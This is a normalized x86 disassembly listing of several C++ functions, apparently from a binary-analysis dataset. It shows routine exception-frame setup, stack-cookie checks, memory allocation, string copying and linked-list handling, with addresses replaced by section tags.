mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000d2c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001ccde
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x50
call sub_10012ca7
mov ebx eax
add esp 0x4
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] 0x0
test ebx ebx
je r-xdata
xor ebx ebx
push r--data
lea edi [ ebx + 0x4 ]
mov [ ebp - 0x4 ] 0x1
push edi
mov [ ebx ] r--data
call sub_1000dea0
lea ecx [ edi + 0x40 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000f090
lea ecx [ edi + 0x24 ]
xor esi esi
mov eax r--data
call sub_10004db0
mov [ edi + 0x20 ] 0x1
jmp r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test ebx ebx
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x4 ] 0xffffffff
call sub_1000dba0
test eax eax
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebx ]
mov edx [ eax ]
push 0x1
mov ecx ebx
call edx
sub_1000d3a0
push ebp
mov ebp esp
push esi
push 0x8
mov esi ecx
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
xor eax eax
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x44 ]
mov ecx [ ecx ]
test edx edx
je r-xdata
add ecx 0x8
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
pop esi
pop ebp
retn 0x4
dec edx
mov ecx [ ecx ]
jne r-xdata
sub_1000d3e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cba8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
push 0x0
push 0x0
lea eax [ ebp - 0x2c ]
push eax
add ecx 0x4
call sub_1000ec10
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov [ edi ] eax
inc eax
push eax
call sub_10012766
mov edx [ ebp - 0x2c ]
mov [ esi ] eax
mov esi 0x10
add esp 0x4
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov ecx eax
lea ebx [ ebx ]
lea edx [ ebp - 0x2c ]
mov al [ edx ]
mov [ ecx ] al
inc edx
inc ecx
test al al
jne r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10012c4b
add esp 0x4
sub_1000d490
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c2f8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x0
call sub_1000e840
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000d500
push ebp
mov ebp esp
sub esp 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_1000d750
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
mov [ eax + 0x4 ] esi
mov [ eax ] r--data
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000d550
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d8b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx ]
mov edi [ ebp + 0x8 ]
mov edx [ eax + 0x10 ]
push edi
call edx
mov esi eax
test esi esi
je r-xdata
push edi
lea edi [ ebp - 0x18 ]
mov ecx ebx
call sub_1000d890
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
cmp edi eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov ecx esi
call edx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x1
lea edi [ ebx + 0x4 ]
jbe r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
mov [ eax ] ecx
mov edx [ edi ]
mov eax [ edi + 0x4 ]
mov [ edx + 0x4 ] eax
cmp [ edi + 0x1c ] 0x10
jb r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi 0x10
lea ecx [ ecx ]
mov [ edi + 0x1c ] 0xf
mov [ edi + 0x18 ] esi
push edi
mov [ edi + 0x8 ] 0x0
call sub_10012c4b
mov eax [ ebp - 0x18 ]
add esp 0x4
dec [ ebp - 0x14 ]
mov ecx [ edi + 0x8 ]
push ecx
call sub_10012c4b
add esp 0x4
mov ebx eax
call sub_1000dfb0
push 0x8
mov esi eax
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
mov eax [ eax ]
push eax
mov ebx edi
call sub_1000d6f0
test eax eax
jne r-xdata
mov eax [ eax ]
xor esi esi
mov [ eax + 0x4 ] esi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov edi eax
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
cmp ebx eax
je r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ edx ]
add eax 0x8
cmp [ eax + 0x14 ] esi
jb r-xdata
lea ebx [ ebp - 0x18 ]
call sub_1000dcc0
mov edx [ ebp - 0x18 ]
push edx
call sub_10012c4b
add esp 0x4
cmp [ ebp - 0x14 ] 0x1
ja r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ ebx ]
mov [ eax ] ecx
mov edx [ ebx ]
mov eax [ ebx + 0x4 ]
mov [ edx + 0x4 ] eax
cmp [ ebx + 0x1c ] esi
jb r-xdata
mov ebx eax
call sub_1000dfb0
mov eax [ eax ]
mov eax [ eax ]
add eax 0x8
mov esi 0x10
cmp [ eax + 0x14 ] esi
jb r-xdata
jmp r-xdata
mov [ ebx + 0x1c ] 0xf
mov [ ebx + 0x18 ] 0x0
push ebx
mov [ ebx + 0x8 ] 0x0
call sub_10012c4b
mov eax [ ebp - 0x18 ]
add esp 0x4
dec [ ebp - 0x14 ]
mov ecx [ ebx + 0x8 ]
push ecx
call sub_10012c4b
add esp 0x4
mov eax [ eax ]
add eax 0x8
cmp [ eax + 0x14 ] esi
jb r-xdata
sub_1000d6f0
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ ebx + 0x44 ] esi
jbe r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x4
lea esp [ esp ]
lea edi [ eax + 0x8 ]
cmp [ edi + 0x18 ] 0x10
lea eax [ edi + 0x4 ]
jb r-xdata
mov ecx esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push eax
call sub_10013189
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax ]
dec ecx
mov eax [ eax ]
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
inc esi
cmp esi [ ebx + 0x44 ]
jb r-xdata
mov eax [ ebx + 0x40 ]
mov eax [ eax ]
test esi esi
je r-xdata
sub_1000d750
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push eax
lea edi [ ebp - 0xc ]
mov ebx ecx
call sub_1000d890
mov eax [ ebp - 0xc ]
mov edi [ eax ]
add ebx 0x4
mov esi 0xf
cmp edi eax
je r-xdata
cmp [ ebp - 0x8 ] 0x1
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov [ ecx ] edx
mov eax [ edi ]
mov ecx [ edi + 0x4 ]
mov [ eax + 0x4 ] ecx
cmp [ edi + 0x1c ] 0x10
jb r-xdata
mov eax [ eax ]
add eax 0x8
cmp [ eax + 0x14 ] 0x10
jb r-xdata
lea esp [ esp ]
mov [ edi + 0x1c ] esi
mov [ edi + 0x18 ] 0x0
push edi
mov [ edi + 0x8 ] 0x0
call sub_10012c4b
mov eax [ ebp - 0xc ]
add esp 0x4
dec [ ebp - 0x8 ]
mov edx [ edi + 0x8 ]
push edx
call sub_10012c4b
add esp 0x4
push eax
call sub_1000d6f0
mov esi [ ebp + 0x8 ]
mov [ esi ] ebx
lea ebx [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
call sub_1000dcc0
mov eax [ ebp - 0xc ]
push eax
call sub_10012c4b
add esp 0x4
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax ]
push eax
call sub_1000d6f0
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ eax ]
mov esi [ ebp + 0x8 ]
xor eax eax
lea ebx [ ebp - 0xc ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
call sub_1000dcc0
mov edx [ ebp - 0xc ]
push edx
call sub_10012c4b
add esp 0x4
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc ]
mov edi [ eax ]
cmp edi eax
je r-xdata
cmp [ ebp - 0x8 ] 0x1
ja r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
mov [ eax ] ecx
mov edx [ edi ]
mov eax [ edi + 0x4 ]
mov [ edx + 0x4 ] eax
cmp [ edi + 0x1c ] 0x10
jb r-xdata
mov eax [ eax ]
add eax 0x8
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov [ edi + 0x1c ] esi
mov [ edi + 0x18 ] 0x0
push edi
mov [ edi + 0x8 ] 0x0
call sub_10012c4b
mov eax [ ebp - 0xc ]
add esp 0x4
dec [ ebp - 0x8 ]
mov ecx [ edi + 0x8 ]
push ecx
call sub_10012c4b
add esp 0x4
sub_1000d890
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d881
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x30 ] eax
lea eax [ ebx + 0x3 ]
mov esi ecx
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x3c ] ebx
call sub_10011c70
push 0x24
mov [ ebp - 0x38 ] eax
mov [ edi + 0x4 ] ebx
call sub_10012ca7
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x34 ] ebx
call sub_10012808
push r--data
lea edx [ ebp - 0x4c ]
push edx
mov [ ebp - 0x4c ] r--data
call sub_10013848
int3
mov [ edi ] eax
mov [ eax ] eax
mov eax [ edi ]
mov [ eax + 0x4 ] eax
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x1c ] 0x10
lea eax [ esi + 0x8 ]
mov [ ebp - 0x3c ] 0x1
jb r-xdata
mov ecx eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
lea esi [ ecx + 0x1 ]
mov edi edi
mov eax [ eax ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov esi ecx
lea ecx [ ebp - 0x2c ]
call sub_10004db0
mov [ ebp - 0x4 ] 0x1
mov esi [ edi ]
mov edx [ esi + 0x4 ]
lea ecx [ ebp - 0x2c ]
push ecx
push edx
push esi
call sub_1000dde0
mov ecx [ edi + 0x4 ]
mov edx 0x9249248
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ edi + 0x4 ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_100126ab
mov ebx [ ebp - 0x30 ]
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x38 ]
push ecx
push ebx
call sub_10013290
xor ecx ecx
add esp 0x8
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x2c ] cl
cmp eax ecx
je r-xdata
mov eax ebx
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov esi eax
sub esi ebx
mov eax ebx
lea ecx [ ebp - 0x2c ]
call sub_10004db0
mov [ ebp - 0x4 ] 0x2
mov esi [ edi ]
mov eax [ esi + 0x4 ]
lea edx [ ebp - 0x2c ]
push edx
push eax
push esi
call sub_1000dde0
mov ecx [ edi + 0x4 ]
mov edx 0x9249248
sub edx ecx
cmp edx 0x1
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov esi eax
mov eax ebx
lea ecx [ ebp - 0x2c ]
call sub_10004db0
mov [ ebp - 0x4 ] 0x3
mov esi [ edi ]
mov edx [ esi + 0x4 ]
lea ecx [ ebp - 0x2c ]
push ecx
push edx
push esi
call sub_1000dd10
mov ecx [ edi + 0x4 ]
mov edx 0x9249248
sub edx ecx
cmp edx 0x1
jb r-xdata
inc ecx
mov [ edi + 0x4 ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
inc ecx
mov [ edi + 0x4 ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ebx [ ebp - 0x30 ]
inc ebx
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
mov eax ebx
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
cmp [ ebx ] 0x0
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add ebx eax
sub_1000dae0
push ebp
mov ebp esp
sub esp 0x8
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_1000d750
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
add eax 0x4
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov [ ebp + 0x8 ] eax
mov ecx [ eax ]
mov [ ebp + 0x8 ] ecx
jmp r-xdata
pop esi
mov edx [ edx + 0x40 ]
push edi
mov edi [ edx ]
push ebx
lea esp [ esp ]
push esi
mov esi [ edx + 0x44 ]
xor ecx ecx
test esi esi
je r-xdata
add eax 0xc
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov edx ecx
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ ecx ]
mov eax [ eax ]
dec edx
mov eax [ eax ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test bl bl
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_1000e080
pop ebx
pop edi
inc ecx
cmp ecx esi
jb r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov eax edi
test ecx ecx
je r-xdata
pop ebx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
add eax 0x2
add edx 0x2
test bl bl
jne r-xdata
mov bl [ eax ]
cmp bl [ edx ]
jne r-xdata
sub_1000dba0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov [ ebp - 0x24 ] eax
push edi
mov eax 0x2
mov ebx ecx
mov esi edx
call sub_10011c70
mov edi eax
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp esi eax
jb r-xdata
sub esp 0x1c
mov ecx esp
xor edi edi
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] edi
mov eax ebx
mov [ ebp - 0x28 ] esp
mov [ ecx ] 0x0
call sub_10004db0
mov ecx [ ebp - 0x24 ]
add ecx 0x4
push ecx
mov edx edi
lea ecx [ ebp - 0x20 ]
call sub_1000e170
xor edx edx
cmp [ ebp - 0x10 ] edx
sete dl
cmp [ ebp - 0xc ] 0x10
mov esi edx
jb r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10012771
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x20 ]
push eax
call sub_10012c4b
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
push ebx
call sub_100131d0
add esp 0xc
test eax eax
jne r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add ebx eax
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
sub esi eax
sub_1000dcc0
mov eax [ ebx ]
push esi
mov esi [ eax ]
mov [ eax ] eax
mov eax [ ebx ]
mov [ eax + 0x4 ] eax
mov [ ebx + 0x4 ] 0x0
cmp esi [ ebx ]
je r-xdata
pop esi
retn
push edi
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x18 ] 0x0
push esi
mov [ esi + 0x8 ] 0x0
call sub_10012c4b
add esp 0x4
mov esi edi
cmp edi [ ebx ]
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
call sub_10012c4b
add esp 0x4
cmp [ esi + 0x1c ] 0x10
mov edi [ esi ]
jb r-xdata
pop edi
sub_1000dd10
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cca5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x24
call sub_10012ca7
mov esi eax
xor eax eax
add esp 0x4
mov [ ebp - 0x14 ] esi
cmp esi eax
je r-xdata
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp + 0x8 ] eax
call sub_10012808
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_10013848
int3
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
lea edi [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x1
cmp edi eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] 0xf
mov [ edi ] al
mov eax [ ebp + 0x10 ]
push eax
or ecx 0xffffffff
xor ebx ebx
call sub_10004820
sub_1000dde0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d495
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x24
call sub_10012ca7
mov ebx eax
xor eax eax
add esp 0x4
mov [ ebp - 0x14 ] ebx
cmp ebx eax
je r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp + 0x8 ] eax
call sub_10012808
push r--data
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x20 ] r--data
call sub_10013848
int3
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] edx
lea esi [ ebx + 0x8 ]
mov [ ebp - 0x4 ] 0x1
cmp esi eax
je r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi [ ebp + 0x10 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
call sub_10005ef0
sub_1000dea0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cc83
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ edi ] r--data
mov eax 0xf
xor esi esi
mov [ edi + 0x18 ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x4 ] 0x0
mov [ ebp - 0x4 ] esi
mov [ edi + 0x38 ] eax
mov [ edi + 0x34 ] esi
mov [ edi + 0x24 ] 0x0
mov [ ebp - 0x4 ] 0x1
push 0x54
mov [ edi + 0x44 ] esi
call sub_10012ca7
add esp 0x4
cmp eax esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] esi
call sub_10012808
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_10013848
int3
mov [ edi + 0x40 ] eax
mov [ eax ] eax
mov eax [ edi + 0x40 ]
mov [ eax + 0x4 ] eax
mov edx [ ebp + 0xc ]
mov eax edx
mov [ ebp - 0x4 ] 0x2
lea esi [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov esi eax
mov eax edx
lea ecx [ edi + 0x4 ]
call sub_10004db0
mov [ edi + 0x20 ] 0x0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1000df80
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000e840
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000dfb0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d138
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea ecx [ edi + 0x24 ]
xor esi esi
mov eax r--data
call sub_10004db0
push ebx
lea eax [ ebp - 0x5c ]
push eax
mov [ edi + 0x20 ] 0x1
call sub_1000dea0
mov [ ebp - 0x4 ] esi
mov esi [ edi + 0x40 ]
mov ecx [ esi + 0x4 ]
push eax
push ecx
push esi
call sub_1000f1a0
mov ecx [ edi + 0x44 ]
mov edx 0x35e50d6
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ edi + 0x44 ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_1000e840
mov ecx [ edi + 0x44 ]
dec ecx
mov eax [ edi + 0x40 ]
mov eax [ eax ]
je r-xdata
push r--data
call sub_100126ab
add eax 0x8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
lea esp [ esp ]
dec ecx
mov eax [ eax ]
jne r-xdata
sub_1000e080
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c69e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov edi [ eax ]
test ecx ecx
je r-xdata
cmp edi [ edx + 0x40 ]
je r-xdata
mov eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
mov [ eax ] ecx
mov edx [ edi ]
mov eax [ edi + 0x4 ]
lea esi [ edi + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
lea ebx [ esi + 0x40 ]
mov [ ebp - 0x14 ] ebx
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_1000f090
mov ecx [ ebx ]
push ecx
call sub_10012c4b
mov ebx 0x10
add esp 0x4
cmp [ esi + 0x38 ] ebx
jb r-xdata
dec eax
mov edi [ edi ]
jne r-xdata
mov [ esi + 0x38 ] 0xf
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x24 ] 0x0
cmp [ esi + 0x18 ] ebx
jb r-xdata
mov edx [ esi + 0x24 ]
push edx
call sub_10012c4b
add esp 0x4
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push edi
mov [ esi + 0x4 ] 0x0
call sub_10012c4b
mov eax [ ebp + 0x8 ]
add esp 0x4
dec [ eax + 0x44 ]
mov eax [ esi + 0x4 ]
push eax
call sub_10012c4b
add esp 0x4
sub_1000e170
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d460
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] edx
mov [ ebp - 0x5c ] ebx
lea eax [ ebx + 0xa ]
mov [ ebp - 0x4 ] ebx
call sub_10011c70
mov [ ebp - 0x54 ] eax
lea eax [ ebx + 0xb ]
call sub_10011c70
mov [ ebp - 0x70 ] eax
lea eax [ ebx + 0x6 ]
call sub_10011c70
mov [ ebp - 0x74 ] eax
lea eax [ ebx + 0x8 ]
call sub_10011c70
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x9 ]
call sub_10011c70
cmp [ ebp + 0x20 ] 0x10
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0xc ]
jae r-xdata
call sub_1000e8f0
mov edi 0xf
mov ecx eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
lea esi [ ecx + 0x1 ]
lea ebx [ ebx ]
lea eax [ ebp + 0xc ]
mov dl [ ecx ]
inc ecx
cmp dl bl
jne r-xdata
sub ecx esi
mov esi ecx
lea ecx [ ebp - 0x48 ]
call sub_10004db0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
push eax
or ecx 0xffffffff
xor ebx ebx
lea edi [ ebp - 0x2c ]
call sub_10004820
lea eax [ ebx + 0x9 ]
mov [ ebp - 0x4 ] 0x2
call sub_10011c70
mov edi [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
mov al [ eax ]
xor ecx ecx
cmp [ edx ] al
jne r-xdata
lea edx [ ebp - 0x2c ]
mov esi [ ebp - 0x64 ]
add esi esi
xor ebx ebx
cmp esi ecx
sete bl
mov [ ebp - 0x4 ] 0x1
cmp edi 0x10
jb r-xdata
inc ecx
cmp [ ecx + edx ] al
je r-xdata
test ebx ebx
jne r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10012c4b
